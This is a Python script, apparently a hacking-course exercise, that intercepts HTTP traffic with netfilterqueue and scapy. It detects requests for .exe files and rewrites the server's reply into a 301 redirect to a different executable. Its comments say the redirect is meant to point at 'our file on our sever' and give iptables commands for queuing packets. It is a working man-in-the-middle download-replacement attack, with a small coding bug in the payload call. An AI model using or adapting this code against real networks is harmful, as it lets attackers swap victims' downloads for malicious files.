#code is reffered from the previos proxy code
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list =[]

def set_load(packet,load):
    packet[scapy.Raw].load= load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload()) #prints the trapped packet
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport== 80: #TCp feildd has a parma of ports
            #print("[+]HTTP Request")
            #print(scapy_packet.show())
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")  #you can use .img , .pdf , .zip etc or anytheng else u can see in the load
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            #print("[+] HTTP Response")
            #print(scapy_packet.show())
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file ")
                #print(scapy_packet.show())

                modified_packet=set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\n Location: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
                
                packet.set_payload[str(modified_packet)]  # convert the packet recievd to a scapy packet


    packet.accept() #forward the packet to the target packet.drop to drop packts (net cuter)



queue=netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()

#we need to make a TCP handshake before we can redirect to our file on our sever
# so what we observe in the request and resposne packets is that 
#in the Request packet : the "ack" field is same as the "seq" feild in the Response
#so we check if they are same using a list based approach, and then we will go on further from that point



# iptables --flush    to delete the new ip tableswe had created

# to practice on our own computer
#sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
#  sudo iptables -I INPUT -j NFQUEUE --queue-num 0

